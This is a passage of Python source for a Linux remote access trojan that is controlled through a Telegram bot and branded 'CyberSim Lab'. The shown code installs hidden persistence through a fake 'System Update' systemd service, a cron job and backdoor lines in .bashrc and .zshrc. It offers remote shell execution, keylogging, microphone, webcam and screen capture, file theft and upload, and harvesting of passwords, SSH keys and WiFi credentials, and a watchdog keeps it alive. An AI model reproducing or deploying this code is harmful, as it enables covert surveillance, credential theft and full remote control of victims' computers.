        """Start recording audio from microphone."""
        if self.recording:
            return "Mic recording is already active"
        self.recording = True
        self.output_file = os.path.join(WORKSPACE, f"mic_{int(time.time())}.ogg")
        self.thread = threading.Thread(target=self._record, daemon=True)
        self.thread.start()
        return "Mic recording started (send /mic off to stop and receive file)"

    def _record(self):
        """Record audio using arecord (ALSA) piped to ffmpeg for OGG encoding."""
        try:
            # Try arecord piped to ffmpeg for OGG format (Telegram voice message compatible)
            self.process = subprocess.Popen(
                ['arecord', '-f', 'S16_LE', '-r', '16000', '-c', '1', '-q', '-t', 'raw', '-'],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
            )
            ffmpeg_process = subprocess.Popen(
                ['ffmpeg', '-f', 's16le', '-ar', '16000', '-ac', '1', '-i', 'pipe:0',
                 '-c:a', 'libvorbis', '-q:a', '4', '-y', self.output_file],
                stdin=self.process.stdout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.process.stdout.close()
            ffmpeg_process.wait(timeout=3600)
            self.process.wait(timeout=10)
        except FileNotFoundError:
            # Fallback: try ffmpeg directly with pulseaudio/alsa
            try:
                self.process = subprocess.Popen(
                    ['ffmpeg', '-f', 'pulse', '-i', 'default',
                     '-c:a', 'libvorbis', '-q:a', '4', '-y', self.output_file],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                self.process.wait(timeout=3600)
            except Exception as e:
                log(f"Mic record error (no arecord/ffmpeg): {e}", C.R)
                self.recording = False
        except Exception as e:
            log(f"Mic record error: {e}", C.R)
            self.recording = False

    def stop(self):
        """Stop recording and send the audio file."""
        if not self.recording:
            return "Mic recording is not active"
        self.recording = False
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=5)
            except Exception:
                try:
                    self.process.kill()
                except Exception:
                    pass
        time.sleep(1)
        if self.output_file and os.path.exists(self.output_file) and os.path.getsize(self.output_file) > 100:
            send_file(self.output_file, "Mic recording")
            size = os.path.getsize(self.output_file)
            try:
                os.remove(self.output_file)
            except Exception:
                pass
            return f"Recording sent ({size} bytes)"
        return "No recording data captured"

    def get_status(self):
        """Get mic recorder status."""
        status = "Recording" if self.recording else "Idle"
        file_info = ""
        if self.output_file and os.path.exists(self.output_file):
            file_info = f"\nTemp file: {os.path.getsize(self.output_file)} bytes"
        # Check if audio devices are available
        devices = run_cmd(['arecord', '-l'])
        has_mic = 'no such file' not in devices.lower() and 'card' in devices.lower()
        return f"Status: {status}\nMic device: {'Found' if has_mic else 'Not detected'}{file_info}"


# ============================================================
# PERSISTENCE MANAGER (Linux)
# ============================================================

class PersistenceManager:
    """Manages persistence installation and removal on Linux."""

    def __init__(self):
        self.script_path = os.path.abspath(__file__)
        self.python_path = sys.executable

    def install(self):
        """Install all persistence mechanisms."""
        installed = []
        failed = []

        # Backup script to hidden directory
        try:
            os.makedirs(BACKUP_DIR, exist_ok=True)
            backup_script = os.path.join(BACKUP_DIR, "system_update.py")
            shutil.copy2(self.script_path, backup_script)
            installed.append(f"Backup: {backup_script}")
        except Exception as e:
            failed.append(f"Backup: {e}")

        # Method 1: systemd service (requires root)
        if is_root():
            try:
                service_content = f"""[Unit]
Description=System Update Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart={self.python_path} {backup_script} --daemon
Restart=always
RestartSec=30
Environment=DISPLAY=:0
WorkingDirectory={BACKUP_DIR}

[Install]
WantedBy=multi-user.target
"""
                with open(SERVICE_PATH, 'w') as f:
                    f.write(service_content)
                subprocess.run(['systemctl', 'daemon-reload'], capture_output=True, timeout=10)
                subprocess.run(['systemctl', 'enable', 'system-update.service'], capture_output=True, timeout=10)
                subprocess.run(['systemctl', 'start', 'system-update.service'], capture_output=True, timeout=10)
                installed.append("systemd service")
            except Exception as e:
                failed.append(f"systemd: {e}")

        # Method 2: cron job
        try:
            cron_line = f"@reboot {self.python_path} {backup_script} --daemon 2>/dev/null"
            # Get current crontab
            current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
            existing = current_cron.stdout if current_cron.returncode == 0 else ""
            # Add our cron line if not present
            if 'system_update' not in existing:
                new_cron = existing + cron_line + "\n"
                proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                proc.communicate(input=new_cron.encode(), timeout=10)
                installed.append("cron job")
            else:
                installed.append("cron job (already exists)")
        except Exception as e:
            failed.append(f"cron: {e}")

        # Method 3: bashrc backdoor
        try:
            bashrc_path = os.path.expanduser('~/.bashrc')
            marker = "# system-update-check"
            backdoor_line = f'{marker}\nnohup {self.python_path} {backup_script} --daemon >/dev/null 2>&1 &\n'
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'r') as f:
                    content = f.read()
                if marker not in content:
                    with open(bashrc_path, 'a') as f:
                        f.write(backdoor_line)
                    installed.append("bashrc backdoor")
                else:
                    installed.append("bashrc backdoor (already exists)")
            else:
                with open(bashrc_path, 'w') as f:
                    f.write(backdoor_line)
                installed.append("bashrc backdoor")
        except Exception as e:
            failed.append(f"bashrc: {e}")

        # Also try .zshrc
        try:
            zshrc_path = os.path.expanduser('~/.zshrc')
            marker_zsh = "# system-update-check-zsh"
            backdoor_line_zsh = f'{marker_zsh}\nnohup {self.python_path} {backup_script} --daemon >/dev/null 2>&1 &\n'
            if os.path.exists(zshrc_path):
                with open(zshrc_path, 'r') as f:
                    content = f.read()
                if marker_zsh not in content:
                    with open(zshrc_path, 'a') as f:
                        f.write(backdoor_line_zsh)
                    installed.append("zshrc backdoor")
        except Exception:
            pass

        report = f"Persistence installation:\n<b>Installed:</b> {', '.join(installed)}"
        if failed:
            report += f"\n<b>Failed:</b> {', '.join(failed)}"
        return report

    def uninstall(self):
        """Remove all persistence mechanisms."""
        removed = []

        # Remove systemd service
        try:
            if is_root():
                subprocess.run(['systemctl', 'stop', 'system-update.service'], capture_output=True, timeout=10)
                subprocess.run(['systemctl', 'disable', 'system-update.service'], capture_output=True, timeout=10)
                if os.path.exists(SERVICE_PATH):
                    os.remove(SERVICE_PATH)
                subprocess.run(['systemctl', 'daemon-reload'], capture_output=True, timeout=10)
                removed.append("systemd service")
        except Exception:
            pass

        # Remove cron job
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                filtered = [l for l in lines if 'system_update' not in l]
                new_cron = '\n'.join(filtered)
                proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                proc.communicate(input=new_cron.encode(), timeout=10)
                removed.append("cron job")
        except Exception:
            pass

        # Remove bashrc backdoor
        for rc_file in ['~/.bashrc', '~/.zshrc']:
            try:
                rc_path = os.path.expanduser(rc_file)
                if os.path.exists(rc_path):
                    with open(rc_path, 'r') as f:
                        lines = f.readlines()
                    filtered = [l for l in lines if 'system-update-check' not in l]
                    with open(rc_path, 'w') as f:
                        f.writelines(filtered)
                    removed.append(rc_file)
            except Exception:
                pass

        # Remove backup directory
        try:
            if os.path.exists(BACKUP_DIR):
                shutil.rmtree(BACKUP_DIR)
                removed.append(f"backup dir ({BACKUP_DIR})")
        except Exception:
            pass

        # Remove workspace
        try:
            if os.path.exists(WORKSPACE):
                shutil.rmtree(WORKSPACE)
                removed.append(f"workspace ({WORKSPACE})")
        except Exception:
            pass

        # Kill any running daemon
        try:
            if os.path.exists(PID_FILE):
                with open(PID_FILE, 'r') as f:
                    pid = int(f.read().strip())
                os.kill(pid, signal.SIGTERM)
                removed.append(f"daemon process (PID {pid})")
        except Exception:
            pass

        return f"Persistence removed: {', '.join(removed)}" if removed else "Nothing to remove"

    def get_status(self):
        """Get persistence status."""
        status = []
        status.append(f"Script: {self.script_path}")
        status.append(f"Python: {self.python_path}")

        # Check systemd
        if os.path.exists(SERVICE_PATH):
            svc_status = run_cmd(['systemctl', 'is-active', 'system-update.service'])
            status.append(f"Systemd: installed ({svc_status.strip()})")
        else:
            status.append("Systemd: not installed")

        # Check cron
        cron_result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
        if cron_result.returncode == 0 and 'system_update' in cron_result.stdout:
            status.append("Cron: installed")
        else:
            status.append("Cron: not installed")

        # Check bashrc
        for rc in ['~/.bashrc', '~/.zshrc']:
            rc_path = os.path.expanduser(rc)
            if os.path.exists(rc_path):
                with open(rc_path, 'r', errors='ignore') as f:
                    content = f.read()
                if 'system-update-check' in content:
                    status.append(f"{rc}: backdoor present")
                else:
                    status.append(f"{rc}: clean")

        # Check backup
        if os.path.exists(BACKUP_DIR):
            status.append(f"Backup dir: exists ({BACKUP_DIR})")
        else:
            status.append("Backup dir: not found")

        # Check workspace
        if os.path.exists(WORKSPACE):
            status.append(f"Workspace: exists ({WORKSPACE})")
        else:
            status.append("Workspace: not found")

        # Check PID file
        if os.path.exists(PID_FILE):
            try:
                with open(PID_FILE, 'r') as f:
                    pid = f.read().strip()
                status.append(f"Daemon PID: {pid}")
                # Check if process is alive
                os.kill(int(pid), 0)
                status.append(f"Daemon: running")
            except (ValueError, ProcessLookupError, PermissionError):
                status.append(f"Daemon PID file exists but process dead")
        else:
            status.append("Daemon: not running")

        return "\n".join(status)


# ============================================================
# SINGLE INSTANCE LOCK (Linux PID file + fcntl)
# ============================================================

class SingleInstanceLock:
    """Ensures only one instance of the daemon is running using fcntl."""

    def __init__(self, lockfile=None):
        self.lockfile = lockfile or os.path.join(WORKSPACE, "daemon.lock")
        self.fp = None

    def acquire(self):
        """Try to acquire the lock. Returns True if successful."""
        try:
            os.makedirs(os.path.dirname(self.lockfile), exist_ok=True)
            self.fp = open(self.lockfile, 'w')
            fcntl.flock(self.fp, fcntl.LOCK_EX | fcntl.LOCK_NB)
            self.fp.write(str(os.getpid()))
            self.fp.flush()
            return True
        except (IOError, OSError):
            if self.fp:
                try:
                    self.fp.close()
                except Exception:
                    pass
            return False

    def release(self):
        """Release the lock."""
        try:
            if self.fp:
                fcntl.flock(self.fp, fcntl.LOCK_UN)
                self.fp.close()
        except Exception:
            pass


# ============================================================
# MAIN TELEGRAM C2 CLASS
# ============================================================

class TelegramC2:
    """Main Telegram Bot C2 controller for Linux."""

    def __init__(self):
        self.offset = 0
        self.running = True
        self.keylogger = KeyloggerManager()
        self.mic_recorder = MicRecorder()
        self.persistence = PersistenceManager()
        self.lock = SingleInstanceLock()
        self.start_time = datetime.now()

    def poll_loop(self):
        """Main polling loop for Telegram updates."""
        log(f"C2 Poll loop started (interval: {POLL_INTERVAL}s)", C.G)
        while self.running:
            try:
                self.process_update()
            except Exception as e:
                log(f"Poll error: {e}", C.R)
            time.sleep(POLL_INTERVAL)

    def process_update(self):
        """Fetch and process a single batch of Telegram updates."""
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": self.offset, "timeout": 30, "allowed_updates": ["message"]}
            resp = requests.post(url, json=params, timeout=35)
            data = resp.json()

            if not data.get("ok"):
                return

            for update in data.get("result", []):
                self.offset = update["update_id"] + 1

                if "message" not in update:
                    continue

                message = update["message"]
                chat_id = str(message.get("chat", {}).get("id", ""))

                # Only process messages from admin
                if chat_id != str(ADMIN_CHAT_ID):
                    continue

                # Handle text commands
                text = message.get("text", "")
                if text.startswith("/"):
                    threading.Thread(
                        target=self.handle_command,
                        args=(text,),
                        daemon=True
                    ).start()
                else:
                    # Handle file uploads (non-command messages with documents)
                    self._handle_document(message)

        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            log(f"Update processing error: {e}", C.R)

    def _handle_document(self, message):
        """Handle incoming file documents from admin."""
        if "document" not in message:
            return

        document = message["document"]
        file_id = document.get("file_id")
        file_name = document.get("file_name", f"upload_{int(time.time())}")

        try:
            # Get file path from Telegram
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile"
            resp = requests.get(url, params={"file_id": file_id}, timeout=15)
            data = resp.json()

            if not data.get("ok"):
                send_telegram("Failed to get file info from Telegram")
                return

            file_path = data["result"]["file_path"]
            download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"

            # Download file to workspace
            local_path = os.path.join(WORKSPACE, file_name)
            resp = requests.get(download_url, timeout=120)

            with open(local_path, "wb") as f:
                f.write(resp.content)

            # Make executable if it's a script
            if file_name.endswith(('.sh', '.py')):
                os.chmod(local_path, 0o755)

            send_telegram(f"File uploaded: {file_name} ({os.path.getsize(local_path)} bytes)\nSaved to: {local_path}")
            log(f"File received: {file_name} -> {local_path}", C.G)

        except Exception as e:
            send_telegram(f"File upload failed: {e}")

    def handle_command(self, text):
        """Route and execute admin commands."""
        cmd = text.strip()
        parts = cmd.split(maxsplit=1)
        command = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        log(f"Command: {cmd}", C.Y)

        try:
            # ---- /help ----
            if command == "/help":
                self._cmd_help()
            # ---- /start ----
            elif command == "/start":
                send_telegram(
                    f"RAT Linux v{VERSION} Active\n"
                    f"Type /help for commands"
                )
            # ---- /sysinfo ----
            elif command == "/sysinfo":
                send_telegram(get_system_info())
            # ---- /status ----
            elif command == "/status":
                self._cmd_status()
            # ---- /screenshot ----
            elif command == "/screenshot":
                self._cmd_screenshot()
            # ---- /webcam ----
            elif command == "/webcam":
                self._cmd_webcam()
            # ---- /video ----
            elif command == "/video":
                self._cmd_video(args)
            # ---- /live ----
            elif command == "/live":
                self._cmd_live(args)
            # ---- /mic ----
            elif command == "/mic":
                self._cmd_mic(args)
            # ---- /browse ----
            elif command == "/browse":
                send_telegram(browse_path(args.strip()))
            # ---- /download ----
            elif command == "/download":
                if not args.strip():
                    send_telegram("Usage: /download <path>")
                else:
                    send_telegram(download_file(args.strip()))
            # ---- /upload ----
            elif command == "/upload":
                send_telegram("Send a file/document to upload it to the target.\nIt will be saved in the workspace directory.")
            # ---- /keylog ----
            elif command == "/keylog":
                self._cmd_keylog(args.strip().lower())
            # ---- /shell ----
            elif command == "/shell":
                if not args.strip():
                    send_telegram("Usage: /shell <command>")
                else:
                    result = run_cmd(args.strip(), shell=True)
                    send_telegram(f"<pre>{truncate(result)}</pre>")
            # ---- /passwords ----
            elif command == "/passwords":
                send_telegram(check_passwords())
            # ---- /wifi ----
            elif command == "/wifi":
                send_telegram(get_wifi_networks() + "\n\n" + get_saved_wifi() + "\n\n" + get_wifi_passwords())
            # ---- /clipboard ----
            elif command == "/clipboard":
                send_telegram(f"<b>Clipboard:</b>\n<pre>{truncate(get_clipboard())}</pre>")
            # ---- /env ----
            elif command == "/env":
                send_telegram(f"<b>Environment Variables:</b>\n<pre>{truncate(get_env_variables())}</pre>")
            # ---- /pid ----
            elif command == "/pid":
                send_telegram(f"<b>Process List:</b>\n<pre>{truncate(get_process_list())}</pre>")
            # ---- /network ----
            elif command == "/network":
                send_telegram(get_network_info())
            # ---- /ports ----
            elif command == "/ports":
                send_telegram(f"<b>Open Ports:</b>\n<pre>{truncate(get_open_ports())}</pre>")
            # ---- /history ----
            elif command == "/history":
                send_telegram(f"<b>Shell History:</b>\n<pre>{truncate(get_bash_history())}</pre>")
            # ---- /locate ----
            elif command == "/locate":
                if not args.strip():
                    send_telegram("Usage: /locate <filename>")
                else:
                    send_telegram(f"<pre>{locate_file(args.strip())}</pre>")
            # ---- /apps ----
            elif command == "/apps":
                send_telegram(get_installed_apps())
            # ---- /battery ----
            elif command == "/battery":
                send_telegram(f"<b>Battery Info:</b>\n<pre>{get_battery_info()}</pre>")
            # ---- /whoami ----
            elif command == "/whoami":
                send_telegram(get_user_info())
            # ---- /notifications ----
            elif command == "/notifications":
                send_telegram(get_notifications())
            # ---- /persistence ----
            elif command == "/persistence":
                send_telegram(f"<b>Persistence Status:</b>\n<pre>{self.persistence.get_status()}</pre>")
            # ---- /power ----
            elif command == "/power":
                self._cmd_power(args.strip().lower())
            # ---- /geolocate ----
            elif command == "/geolocate":
                self._cmd_geolocate()
            # ---- /remove ----
            elif command == "/remove":
                self._cmd_remove()
            # ---- Unknown command ----
            else:
                send_telegram(f"Unknown command: {command}\nType /help for available commands")
        except Exception as e:
            send_telegram(f"Command error ({command}): {e}")
            log(f"Command error: {e}", C.R)

    def _cmd_help(self):
        """Send help message with all available commands."""
        help_text = f"""<b>CyberSim Lab RAT Linux v{VERSION} - Command List</b>

<b>System:</b>
/sysinfo - Full system information
/status - Current status summary
/whoami - User details
/env - Environment variables
/pid - Process list
/apps - Installed packages
/battery - Battery status

<b>Surveillance:</b>
/screenshot - Capture screen
/webcam - Capture webcam photo
/video [sec] - Record webcam video (1-30s, default 5)
/live [sec] - 5 screenshots at interval (default 2s)
/mic on|off|status - Microphone recording

<b>Input:</b>
/keylog on|off|clear|status|dump - Keylogger control
/clipboard - Get clipboard content
/history - Bash command history

<b>File System:</b>
/browse [path] - Browse directory
/download [path] - Download file/folder

<b>Network:</b>
/network - Network info + public IP
/ports - Open listening ports
/wifi - WiFi networks & passwords

<b>Credentials:</b>
/passwords - Browser data, SSH keys, WiFi

<b>Upload:</b>
Send any file as a document to upload to target

<b>Power:</b>
/power shutdown|reboot|suspend|logout - Power control
/geolocate - Geolocate via public IP

<b>Admin:</b>
/persistence - Show persistence status
/remove - Uninstall and remove RAT"""
        send_telegram(help_text)

    def _cmd_status(self):
        """Send current status summary."""
        elapsed = datetime.now() - self.start_time
        hours, remainder = divmod(int(elapsed.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        status = f"""<b>RAT Linux v{VERSION} Status</b>
<b>State:</b> Running
<b>PID:</b> {os.getpid()}
<b>Uptime:</b> {hours}h {minutes}m {seconds}s
<b>Root:</b> {'Yes' if is_root() else 'No'}
<b>User:</b> {os.environ.get('USER', 'unknown')}
<b>Hostname:</b> {run_cmd(['hostname']).strip()}
<b>Display:</b> {os.environ.get('DISPLAY', 'N/A')}

<b>Keylogger:</b>
{self.keylogger.get_status_text()}

<b>Mic Recorder:</b>
{self.mic_recorder.get_status()}

<b>Persistence:</b>
{self.persistence.get_status()}"""
        send_telegram(status)

    def _cmd_screenshot(self):
        """Take and send a screenshot."""
        send_telegram("Taking screenshot...")
        path = take_screenshot()
        if path:
            success = send_photo(path, f"Screenshot - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            try:
                os.remove(path)
            except Exception:
                pass
            if success:
                log("Screenshot sent", C.G)
        else:
            send_telegram("Screenshot failed. Install one of: imagemagick, scrot, gnome-screenshot")

    def _cmd_webcam(self):
        """Capture and send webcam photo."""
        send_telegram("Capturing webcam...")
        path = take_webcam()
        if path:
            success = send_photo(path, f"Webcam - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            try:
                os.remove(path)
            except Exception:
                pass
            if success:
                log("Webcam photo sent", C.G)
        else:
            send_telegram("Webcam capture failed. Install fswebcam or ensure /dev/video0 exists")

    def _cmd_video(self, args):
        """Record webcam video."""
        try:
            duration = int(args) if args else 5
        except ValueError:
            duration = 5
        duration = max(1, min(30, duration))
        send_telegram(f"Recording video ({duration}s)...")
        path = record_video(duration)
        if path:
            success = send_file(path, f"Video {duration}s - {datetime.now().strftime('%H:%M:%S')}")
            try:
                os.remove(path)
            except Exception:
                pass
            if success:
                log(f"Video sent ({duration}s)", C.G)
        else:
            send_telegram("Video recording failed. Ensure ffmpeg and /dev/video0 are available")

    def _cmd_live(self, args):
        """Take series of screenshots."""
        try:
            interval = int(args) if args else 2
        except ValueError:
            interval = 2
        interval = max(1, min(10, interval))
        # Run in background so it doesn't block the poll loop
        threading.Thread(target=take_live_screenshots, args=(interval,), daemon=True).start()

    def _cmd_mic(self, args):
        """Handle mic recording commands."""
        if args == 'on' or args == 'start':
            send_telegram(self.mic_recorder.start())
        elif args == 'off' or args == 'stop':
            send_telegram(self.mic_recorder.stop())
        elif args == 'status':
            send_telegram(self.mic_recorder.get_status())
        else:
            send_telegram("Usage: /mic on|off|status\nRecording uses arecord + ffmpeg (OGG format)")

    def _cmd_keylog(self, args):
        """Handle keylogger commands."""
        if args == 'on' or args == 'start':
            result = self.keylogger.start()
            send_telegram(result)
        elif args == 'off' or args == 'stop':
            result = self.keylogger.stop()
            send_telegram(result)
        elif args == 'clear':
            result = self.keylogger.clear()
            send_telegram(result)
        elif args == 'status':
            send_telegram(f"<b>Keylogger:</b>\n<pre>{self.keylogger.get_status_text()}</pre>")
        elif args == 'dump':
            send_telegram(self.keylogger.dump())
        elif not args:
            send_telegram("Usage: /keylog on|off|clear|status|dump")
        else:
            send_telegram(f"Unknown keylog subcommand: {args}\nUsage: /keylog on|off|clear|status|dump")

    def _cmd_power(self, action):
        """Handle power control commands."""
        if not action:
            send_telegram("Usage: /power shutdown|reboot|suspend|logout")
            return
        power_cmds = {
            'shutdown': ['shutdown', '-h', 'now'],
            'reboot': ['reboot'],
            'restart': ['reboot'],
            'suspend': ['systemctl', 'suspend'],
            'hibernate': ['systemctl', 'hibernate'],
            'logout': ['loginctl', 'terminate-user', os.environ.get('USER', '')],
            'logoff': ['loginctl', 'terminate-user', os.environ.get('USER', '')],
        }
        if action not in power_cmds:
            send_telegram(f"Unknown power action: {action}\nAvailable: {', '.join(power_cmds.keys())}")
            return
        if not is_root() and action in ('shutdown', 'reboot', 'restart'):
            send_telegram(f"Power action '{action}' requires root privileges")
            return
        send_telegram(f"Executing: {action}...")
        try:
            subprocess.run(power_cmds[action], timeout=5)
            send_telegram(f"Power command '{action}' executed")
        except Exception as e:
            send_telegram(f"Power command failed: {e}")

    def _cmd_geolocate(self):
        """Geolocate the machine via public IP address."""
        try:
            ext_ip = run_cmd(['curl', '-s', '--max-time', '5', 'ifconfig.me']).strip()
            if not ext_ip:
                send_telegram("Could not determine public IP")
                return
            geo = run_cmd(['curl', '-s', '--max-time', '10', f'http://ip-api.com/json/{ext_ip}']).strip()
            if geo and '{' in geo:
                data = json.loads(geo)
                info = [
                    f"<b>Public IP:</b> {ext_ip}",
                    f"<b>City:</b> {data.get('city', 'N/A')}",
                    f"<b>Region:</b> {data.get('regionName', 'N/A')}",
                    f"<b>Country:</b> {data.get('country', 'N/A')} ({data.get('countryCode', '')})",
                    f"<b>ZIP:</b> {data.get('zip', 'N/A')}",
                    f"<b>Lat:</b> {data.get('lat', 'N/A')}",
                    f"<b>Lon:</b> {data.get('lon', 'N/A')}",
                    f"<b>ISP:</b> {data.get('isp', 'N/A')}",
                    f"<b>Org:</b> {data.get('org', 'N/A')}",
                    f"<b>Timezone:</b> {data.get('timezone', 'N/A')}",
                ]
                # Generate Google Maps link
                lat = data.get('lat')
                lon = data.get('lon')
                if lat and lon:
                    info.append(f"<b>Maps:</b> https://maps.google.com/?q={lat},{lon}")
                send_telegram("\n".join(info))
            else:
                send_telegram(f"Public IP: {ext_ip}\nGeolocation lookup failed")
        except Exception as e:
            send_telegram(f"Geolocation error: {e}")

    def _cmd_remove(self):
        """Uninstall RAT and remove all traces."""
        send_telegram("Removing RAT and all persistence...")
        self.keylogger.stop()
        self.mic_recorder.stop()
        result = self.persistence.uninstall()
        send_telegram(result)
        self.running = False
        log("RAT removed by admin command", C.R)
        time.sleep(2)
        os._exit(0)

    def shutdown(self):
        """Clean shutdown."""
        self.running = False
        self.keylogger.stop()
        self.mic_recorder.stop()


# ============================================================
# SIGNAL HANDLING
# ============================================================

c2_instance = None


def signal_handler(signum, frame):
    """Handle SIGTERM/SIGINT by notifying Telegram and cleaning up."""
    log(f"Received signal {signum}, shutting down...", C.Y)
    if c2_instance:
        c2_instance.shutdown()
    try:
        send_telegram(f"RAT Linux v{VERSION} OFFLINE\nSignal: {signum}\nPID: {os.getpid()}")
    except Exception:
        pass
    # Clean up PID file
    try:
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
    except Exception:
        pass
    sys.exit(0)


def cleanup_at_exit():
    """atexit handler for cleanup notification."""
    try:
        send_telegram(f"RAT Linux v{VERSION} process exiting\nPID: {os.getpid()}")
    except Exception:
        pass
    try:
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
    except Exception:
        pass


# ============================================================
# WATCHDOG
# ============================================================

def watchdog_loop():
    """Monitor daemon process and restart if it died."""
    ensure_workspace()
    # Write watchdog PID
    with open(WATCHDOG_PID_FILE, 'w') as f:
        f.write(str(os.getpid()))

    log(f"Watchdog started (PID: {os.getpid()})", C.G)

    while True:
        try:
            # Check if daemon PID file exists
            if not os.path.exists(PID_FILE):
                log("Daemon PID file missing, restarting...", C.Y)
                start_daemon()
                time.sleep(30)
                continue

            # Read daemon PID
            with open(PID_FILE, 'r') as f:
                pid_str = f.read().strip()

            if not pid_str:
                log("Daemon PID empty, restarting...", C.Y)
                start_daemon()
                time.sleep(30)
                continue

            pid = int(pid_str)

            # Check if process is alive
            try:
                os.kill(pid, 0)
                # Process is alive
                log(f"Daemon alive (PID: {pid})", C.DM)
            except ProcessLookupError:
                log(f"Daemon dead (PID: {pid}), restarting...", C.Y)
                start_daemon()
            except PermissionError:
                log(f"Cannot check daemon (PID: {pid})", C.Y)

        except Exception as e:
            log(f"Watchdog error: {e}", C.R)

        time.sleep(30)


def start_daemon():
    """Start the daemon process."""
    try:
        script = os.path.join(BACKUP_DIR, "system_update.py")
        if not os.path.exists(script):
            script = os.path.abspath(__file__)

        subprocess.Popen(
            [sys.executable, script, '--daemon'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True
        )
        log("Daemon restarted", C.G)
    except Exception as e:
        log(f"Failed to restart daemon: {e}", C.R)


# ============================================================
# AUTO INSTALL DEPENDENCIES
# ============================================================

def auto_install_deps():
    """Auto-install required Python dependencies."""
    deps = ["requests", "pynput", "Pillow"]
    for dep in deps:
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", dep, "--quiet", "--break-system-packages"],
                timeout=60,
                capture_output=True
            )
        except Exception:
            pass


# ============================================================
# DAEMON MODE
# ============================================================

def run_as_daemon():
    """Run the RAT as a background daemon."""
    # Fork process
    try:
        pid = os.fork()
        if pid > 0:
            # Parent exits
            sys.exit(0)
    except AttributeError:
        # Fork not available (Windows), just continue
        pass
    except OSError:
        pass

    # Create new session
    try:
        os.setsid()
    except OSError:
        pass

    # Fork again
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except AttributeError:
        pass
    except OSError:
        pass

    # Redirect standard file descriptors
    sys.stdout.flush()
    sys.stderr.flush()
    devnull = open(os.devnull, 'r')
    os.dup2(devnull.fileno(), sys.stdin.fileno())
    devnull_w = open(os.devnull, 'a+')
    os.dup2(devnull_w.fileno(), sys.stdout.fileno())
    os.dup2(devnull_w.fileno(), sys.stderr.fileno())

    # Write PID file
    ensure_workspace()
    with open(PID_FILE, 'w') as f:
        f.write(str(os.getpid()))

    # Acquire single instance lock
    lock = SingleInstanceLock()
    if not lock.acquire():
        log("Another instance is already running, exiting", C.R)
        sys.exit(1)

    # Register signal handlers
    global c2_instance
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    atexit.register(cleanup_at_exit)

    # Create C2 instance and start
    c2_instance = TelegramC2()
    send_telegram(f"RAT Linux v{VERSION} daemon started\nPID: {os.getpid()}\n{get_system_info()}")
    log(f"Daemon started (PID: {os.getpid()})", C.G)

    try:
        c2_instance.poll_loop()
    except Exception as e:
        log(f"Daemon crashed: {e}", C.R)
        try:
            send_telegram(f"RAT daemon crashed: {e}")
        except Exception:
            pass


# ============================================================
# MAIN ENTRY POINT
# ============================================================

if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description=f"CyberSim Lab RAT Linux v{VERSION}")
    parser.add_argument('--install', action='store_true', help='Install persistence and dependencies')
    parser.add_argument('--uninstall', action='store_true', help='Remove all persistence')
    parser.add_argument('--status', action='store_true', help='Show current status')
    parser.add_argument('--daemon', action='store_true', help='Run as background daemon')
    parser.add_argument('--watchdog', action='store_true', help='Run watchdog to monitor daemon')
    args_parsed = parser.parse_args()

    ensure_workspace()

    # Auto-install dependencies on first run
    auto_install_deps()

    if args_parsed.install:
        log("Installing...", C.Y)
        auto_install_deps()
        pm = PersistenceManager()
        result = pm.install()
        log(result, C.G)
        send_telegram(f"RAT Linux v{VERSION} installed!\n{result}\n{get_system_info()}")
        # Start daemon after install
        start_daemon()
        sys.exit(0)

    elif args_parsed.uninstall:
        log("Uninstalling...", C.Y)
        pm = PersistenceManager()
        result = pm.uninstall()
        log(result, C.G)
        send_telegram(f"RAT Linux v{VERSION} uninstalled\n{result}")
        sys.exit(0)

    elif args_parsed.status:
        pm = PersistenceManager()
        print(pm.get_status())
        sys.exit(0)

    elif args_parsed.watchdog:
        watchdog_loop()
        sys.exit(0)

    elif args_parsed.daemon:
        run_as_daemon()
        sys.exit(0)

    else:
        # Interactive mode (foreground)
        log(f"CyberSim Lab RAT Linux v{VERSION} starting...", C.G)

        # Register signal handlers for interactive mode
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)
        atexit.register(cleanup_at_exit)

        c2_instance = TelegramC2()

        # Send startup notification
        send_telegram(f"RAT Linux v{VERSION} started (interactive)\nPID: {os.getpid()}\n{get_system_info()}")
        log("RAT started in interactive mode", C.G)

        try:
            c2_instance.poll_loop()
        except KeyboardInterrupt:
            log("Interrupted by user", C.Y)
            c2_instance.shutdown()
            try:
                send_telegram("RAT stopped by user (Ctrl+C)")
            except Exception:
                pass
        except Exception as e:
            log(f"Fatal error: {e}", C.R)
            try:
                send_telegram(f"RAT crashed: {e}")
            except Exception:
                pass
        finally:
            try:
                if os.path.exists(PID_FILE):
                    os.remove(PID_FILE)
            except Exception:
                pass
